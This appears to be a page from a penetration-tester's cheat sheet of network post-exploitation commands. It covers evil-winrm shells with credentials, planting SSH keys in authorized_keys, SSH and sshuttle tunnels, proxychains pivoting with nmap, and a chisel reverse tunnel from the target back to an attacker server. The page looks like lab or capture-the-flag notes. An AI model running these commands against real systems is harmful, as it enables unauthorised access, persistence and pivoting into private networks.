---
title: network
weight: 20
---

# evil-winrm
----------------

get shell via evil-winrm
```shell
./evil-winrm.rb -u username -p password -i target-ip
```
----------------


# ssh / tunneling
----------------

create ssh-key
```shell
ssh-keygen
```

add public-key to authorized_keys
```shell
cat rsa.pub >> authorized_keys
```

set permission on private-key
```shell
chmod 600 id_rsa
```

login via ssh-key
```shell
ssh -i id_rsa username@target-ip
```

login with older ciphers
```shell
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc username@target-ip
```

start tool after ssh login
```shell
ssh username@target-ip -o "ProxyCommand=ncat --proxy-type http --proxy target-ip:proxy-port 127.0.0.1 22"
```

ssh port forwarding
```shell
ssh -N -L 80:127.0.0.1:80 username@target-ip
```

dynamic ssh port forward
```shell
ssh -N -D 9050 username@target-ip
```

----------------

# proxychains
----------------

Use `proxychains + command" to use the socks proxy
```shell
ssh -N -D 9050 root@10.10.110.100 -i id_rsa.root
proxychains4 -q nmap -sTV -n -PN 172.16.1.20
```

> Double pivot works the same, but you create the 2nd ssh tunnel via proxychains and a different dynamic port. 
After the tunnel is up, you can comment out the first socks entry in proxychains config.

----------------

# sshuttle
----------------

pivot via sshuttle
```shell
sshuttle -vr <via-ssh-server> <Remote-Net-To-Route>
```
```shell
sshuttle -vr username@target-ip 10.1.1.0/24
```

----------------

# chisel
----------------

attacker (server)
```shell
chisel server -p 9002 --reverse 
```

target (client)
```shell
execute chisel.exe client 10.10.14.23:9002 R:socks
```
----------------